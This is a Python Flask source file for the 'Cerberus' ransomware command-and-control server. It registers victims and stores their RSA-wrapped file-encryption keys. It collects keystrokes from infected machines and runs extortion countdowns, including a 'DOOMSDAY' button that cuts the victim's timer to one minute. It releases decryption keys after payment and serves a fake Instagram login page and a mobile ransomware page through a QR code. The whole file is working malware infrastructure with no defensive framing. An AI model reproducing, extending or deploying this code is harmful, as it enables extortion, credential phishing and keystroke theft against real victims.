import os
import base64
import requests
import datetime
import io
import socket
import qrcode
import time
from flask import Flask, request, jsonify, render_template_string, redirect, url_for, render_template, send_file
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend

# --- Configuration ---
C2_HOST = '0.0.0.0'
C2_PORT = 5000

# --- In-Memory "Database" ---
# Structure: {victim_id: {status: str, encrypted_key: str, decrypted_key: str, first_seen: str, timer: int}}
victims = {}

# --- Cryptography Setup ---
PRIVATE_KEY_FILE = "attacker_private_key.pem"
PUBLIC_KEY_FILE = "attacker_public_key.pem"

def generate_keys():
    print("Generating new RSA key pair...")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    with open(PRIVATE_KEY_FILE, "wb") as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ))
    with open(PUBLIC_KEY_FILE, "wb") as f:
        f.write(public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))
    print(f"Keys saved to {PRIVATE_KEY_FILE} and {PUBLIC_KEY_FILE}")
    return private_key, public_key

if os.path.exists(PRIVATE_KEY_FILE) and os.path.exists(PUBLIC_KEY_FILE):
    with open(PRIVATE_KEY_FILE, "rb") as f:
        private_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())
    with open(PUBLIC_KEY_FILE, "rb") as f:
        public_key = serialization.load_pem_public_key(f.read(), backend=default_backend())
    print("Loaded existing RSA key pair.")
else:
    private_key, public_key = generate_keys()

ATTACKER_PUBLIC_KEY = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
).decode('utf-8')

# --- Flask App ---
app = Flask(__name__)

@app.route('/')
def home():
    # Advanced Dashboard HTML
    html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Cerberus C2 Command Center</title>
        <meta http-equiv="refresh" content="5">
        <style>
            body { background-color: #0d0d0d; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; }
            h1 { text-align: center; color: #ff3333; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 30px; text-shadow: 0 0 10px #ff0000; }
            .container { max-width: 1200px; margin: 0 auto; }
            table { width: 100%; border-collapse: collapse; background-color: #1a1a1a; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
            th, td { padding: 15px; text-align: left; border-bottom: 1px solid #333; }
            th { background-color: #252525; color: #ff3333; font-weight: bold; text-transform: uppercase; }
            tr:hover { background-color: #222; }
            .btn { display: inline-block; padding: 6px 12px; margin: 2px; border-radius: 4px; text-decoration: none; font-size: 12px; font-weight: bold; transition: all 0.2s; border: none; cursor: pointer; }
            .btn-pay { background-color: #28a745; color: white; }
            .btn-pay:hover { background-color: #218838; box-shadow: 0 0 8px #28a745; }
            .btn-time { background-color: #007bff; color: white; }
            .btn-time:hover { background-color: #0056b3; }
            .btn-doom { background-color: #dc3545; color: white; }
            .btn-doom:hover { background-color: #c82333; box-shadow: 0 0 10px #dc3545; }
            .status-badge { padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }
            .status-unpaid { background-color: #dc3545; color: white; }
            .status-paid { background-color: #28a745; color: white; }
            .timer { font-family: 'Courier New', monospace; font-size: 16px; color: #ffcc00; font-weight: bold; }
            .id-col { font-family: monospace; color: #aaa; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Cerberus Ransomware C2</h1>
            <table>
                <thead>
                    <tr>
                        <th>Victim ID</th>
                        <th>IP Address</th>
                        <th>Status</th>
                        <th>Time Remaining</th>
                        <th>Controls</th>
                    </tr>
                </thead>
                <tbody>
    """
    
    for vid, data in victims.items():
        # Timer Formatting
        seconds = data.get('timer', 72*3600)
        m, s = divmod(seconds, 60)
        h, m = divmod(m, 60)
        timer_str = f"{h:02d}:{m:02d}:{s:02d}"
        
        status_html = ""
        if data['status'] == 'UNPAID':
             status_html = '<span class="status-badge status-unpaid">LOCKED</span>'
        elif data['status'] == 'KEY_SENT':
             status_html = '<span class="status-badge status-paid">DECRYPTING</span>'
        else:
             status_html = f'<span class="status-badge">{data["status"]}</span>'

        html += f"""
                    <tr>
                        <td class="id-col"><a href="/victim/{vid}" style="color: #00ff00; text-decoration: none;">{vid}</a></td>
                        <td class="id-col">{data.get('ip', 'Unknown')}</td>
                        <td>{status_html}</td>
                        <td class="timer">{timer_str}</td>
                        <td>
                            <a href="/mark_paid/{vid}" class="btn btn-pay">RELEASE KEY</a>
                            <br>
                            <a href="/api/timer/{vid}/add_1h" class="btn btn-time">+1 H</a>
                            <a href="/api/timer/{vid}/sub_1h" class="btn btn-time">-1 H</a>
                            <a href="/api/timer/{vid}/doomsday" class="btn btn-doom">💀 DOOMSDAY</a>
                        </td>
                    </tr>
        """
    
    html += """
                </tbody>
            </table>
            <div style="text-align: center; margin-top: 20px; color: #555;">
                <p>Server Online | Listening on Port 5000</p>
                <p>Use 'DOOMSDAY' to set timer to 1 minute instant panic.</p>
                <p><a href="/qr" target="_blank" style="color: #00ff00; font-weight: bold;">[GENERATE MOBILE QR CODE]</a></p>
            </div>
        </div>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/victim/<victim_id>')
def victim_details(victim_id):
    if victim_id not in victims:
        return "Victim not found", 404
    
    victim = victims[victim_id]
    keystrokes = victim.get('keystrokes', 'No keystrokes captured yet.')
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Victim Details - {victim_id}</title>
        <meta http-equiv="refresh" content="5">
        <style>
            body {{ background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }}
            .container {{ max-width: 1200px; margin: 0 auto; }}
            h1 {{ color: #ff3333; text-shadow: 0 0 10px #ff3333; }}
            .info-box {{ background-color: #1a1a1a; padding: 20px; margin: 20px 0; border: 1px solid #333; border-radius: 8px; }}
            .keylog-box {{ background-color: #0d0d0d; padding: 15px; margin: 10px 0; border-left: 3px solid #00ff00; font-size: 14px; white-space: pre-wrap; word-wrap: break-word; max-height: 600px; overflow-y: auto; }}
            .back-btn {{ display: inline-block; padding: 10px 20px; background-color: #007bff; color: white; text-decoration: none; border-radius: 4px; margin-top: 20px; }}
            .back-btn:hover {{ background-color: #0056b3; }}
            label {{ color: #ffcc00; font-weight: bold; }}
            .refresh-notice {{ color: #888; font-size: 12px; text-align: center; margin-top: 10px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Victim Details: {victim_id}</h1>
            
            <div class="info-box">
                <p><label>IP Address:</label> {victim.get('ip', 'Unknown')}</p>
                <p><label>Status:</label> {victim.get('status', 'Unknown')}</p>
                <p><label>First Seen:</label> {victim.get('first_seen', 'Unknown')}</p>
                <p><label>Type:</label> {victim.get('type', 'Unknown')}</p>
            </div>
            
            <div class="info-box">
                <h2 style="color: #00ff00;">Captured Keystrokes</h2>
                <div class="keylog-box">{keystrokes if keystrokes else 'No keystrokes captured yet.'}</div>
                <p class="refresh-notice">⟳ Auto-refreshing every 5 seconds...</p>
            </div>
            
            <a href="/" class="back-btn">← Back to Dashboard</a>
        </div>
    </body>
    </html>
    """
    return html

@app.route('/instagram')
def instagram_login():
    return render_template('fake_instagram.html')

@app.route('/mobile_payload')
def mobile_payload():
    return render_template('mobile_ransomware.html')

@app.route('/qr')
def get_qr():
    # Detect LAN IP to make the QR code work for phones on the same WiFi
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except:
        ip = '127.0.0.1'
        
    url = f"http://{ip}:{C2_PORT}/instagram"
    
    img = qrcode.make(url)
    buf = io.BytesIO()
    img.save(buf)
    buf.seek(0)
    return send_file(buf, mimetype='image/png')

@app.route('/api/checkin', methods=['POST'])
def checkin():
    encrypted_aes_key_b64 = request.json.get('key')
    if not encrypted_aes_key_b64:
        return jsonify({"error": "Missing key"}), 400

    # Use URL-safe base64 to prevent routing issues with '/' characters
    victim_id = base64.urlsafe_b64encode(os.urandom(8)).decode('utf-8').rstrip('=')
    
    # Store timestamp for server-side timer enforcement
    start_timestamp = time.time()
    
    # Handle Mobile Simulation (fake key)
    if encrypted_aes_key_b64 == 'MOBILE_SIMULATION':
        victims[victim_id] = {
            "status": "UNPAID",
            "type": "MOBILE",
            "encrypted_key": "MOBILE_SIMULATION",
            "decrypted_key": "MOBILE_UNLOCK_CODE", # Auto-ready once paid
            "first_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "start_timestamp": start_timestamp,
            "timer": 72 * 3600,
            "ip": request.remote_addr
            
        }
        print(f"[+] New Mobile Victim: {victim_id}")
        return jsonify({"victim_id": victim_id})

    victims[victim_id] = {
        "status": "UNPAID",
        "type": "DESKTOP",
        "encrypted_key": encrypted_aes_key_b64,
        "decrypted_key": None,
        "first_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "checkin_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "start_timestamp": start_timestamp,
        "timer": 72 * 3600, # Default 72 hours
        "ip": request.remote_addr
    }
    print(f"[+] New victim check-in: {victim_id}")
    return jsonify({"victim_id": victim_id})

@app.route('/api/keylog/<victim_id>', methods=['POST'])
def receive_keylog(victim_id):
    # Handle OFFLINE victims
    if victim_id.startswith("OFFLINE-"):
        data = request.json.get('keys', '')
        if data:
            print(f"[Keylog] OFFLINE victim {victim_id}: {data[:50]}...")  # Show first 50 chars
        return jsonify({"status": "ok"})
    
    if victim_id not in victims:
        return jsonify({"status": "unknown"}), 404
        
    data = request.json.get('keys', '')
    if data:
        print(f"[Keylog] Received {len(data)} chars from {victim_id}")
        if 'keystrokes' not in victims[victim_id]:
            victims[victim_id]['keystrokes'] = ""
        timestamp = datetime.datetime.now().strftime("[%H:%M:%S] ")
        victims[victim_id]['keystrokes'] += f"\n{timestamp}{data}"
        
    return jsonify({"status": "ok"})

@app.route('/api/status/<victim_id>', methods=['GET'])
def get_status(victim_id):
    # Handle OFFLINE victims gracefully
    if victim_id.startswith("OFFLINE-"):
        print(f"[!] OFFLINE victim polling: {victim_id} (never checked in)")
        return jsonify({
            "status": "OFFLINE",
            "message": "Victim is in offline mode. Check-in failed.",
            "command": None
        })
    
    if victim_id not in victims:
        return jsonify({"status": "unknown"}), 404
    
    victim_data = victims[victim_id]
    
    # --- SERVER-SIDE TIMER ENFORCEMENT ---
    # Calculate how much time has REALLY passed since infection
    elapsed = time.time() - victim_data.get('start_timestamp', time.time())
    server_time_left = max(0, int((72 * 3600) - elapsed))
    
    # Update our server record to reflect reality
    victim_data['timer'] = server_time_left
    
    response = {
        "status": "waiting", 
        "server_timer": server_time_left
    }
    
    # Check if we need to force-update the victim's timer
    # (If victim reports significantly more time than server thinks they have)
    victim_reported_time = request.args.get('time_left', type=int)
    if victim_reported_time is not None:
        if server_time_left < (victim_reported_time - 60): # 60s buffer
            response["new_timer"] = server_time_left

    # Check for direct key delivery
    if victim_data['status'] == 'KEY_SENT' and victim_data.get('decrypted_key'):
        response["status"] = "ready"
        response["key"] = victim_data['decrypted_key']
    
    # Check for manual timer overrides (Dashboard buttons)
    if 'pending_timer_update' in victim_data:
        response["new_timer"] = victim_data['pending_timer_update']
        # Reset start_timestamp to match the new manual time
        # New Start = Now - (72h - New_Time)
        # So: Elapsed = 72h - New_Time
        new_elapsed = (72 * 3600) - victim_data['pending_timer_update']
        victim_data['start_timestamp'] = time.time() - new_elapsed
        
        del victim_data['pending_timer_update'] 
        
    return jsonify(response)

@app.route('/api/timer/<victim_id>/<action>')
def update_timer(victim_id, action):
    if victim_id not in victims:
        return "Unknown victim", 404
    
    current_timer = victims[victim_id].get('timer', 72*3600)
    
    if action == 'add_1h':
        new_time = current_timer + 3600
    elif action == 'sub_1h':
        new_time = max(0, current_timer - 3600)
    elif action == 'reset':
        new_time = 72 * 3600
    elif action == 'doomsday':
        new_time = 60 # 1 minute left!
    else:
        return "Invalid action", 400
        
    victims[victim_id]['timer'] = new_time
    # Queue this update to be sent to the victim on next heartbeat
    victims[victim_id]['pending_timer_update'] = new_time
    return redirect(url_for('home'))

@app.route('/mark_paid/<victim_id>', methods=['POST', 'GET'])
def mark_as_paid(victim_id):
    victim_data = victims.get(victim_id)
    if not victim_data or victim_data['status'] != 'UNPAID':
        return redirect(url_for('home'))

    print(f"[*] Marking victim {victim_id} as paid. Decrypting key...")
    encrypted_aes_key_b64 = victim_data['encrypted_key']
    
    # Bypass for Mobile Simulation
    if victim_data.get('type') == 'MOBILE':
        victims[victim_id]['status'] = 'KEY_SENT'
        # Decrypted key is already set to dummy value
        print(f"[+] Mobile unlocking signal ready for {victim_id}")
        return redirect(url_for('home'))

    try:
        encrypted_aes_key = base64.b64decode(encrypted_aes_key_b64)
        aes_key = private_key.decrypt(
            encrypted_aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        aes_key_b64 = base64.b64encode(aes_key).decode('utf-8')
        
        # Store the decrypted key in memory for direct delivery
        victims[victim_id]['status'] = 'KEY_SENT'
        victims[victim_id]['decrypted_key'] = aes_key_b64
        print(f"[+] Decryption key for {victim_id} is ready for delivery.")

    except Exception as e:
        print(f"[-] Error decrypting key for {victim_id}: {e}")
        victims[victim_id]['status'] = 'ERROR'

    return redirect(url_for('home'))

if __name__ == '__main__':
    print("\n" + "="*50)
    print("         Cerberus C2 Server Online")
    print("="*50)
    print(f"-> Public Key:\n{ATTACKER_PUBLIC_KEY}")
    print(f"-> Dashboard: http://{C2_HOST}:{C2_PORT}")
    print("="*50 + "\n")
    app.run(host=C2_HOST, port=C2_PORT)
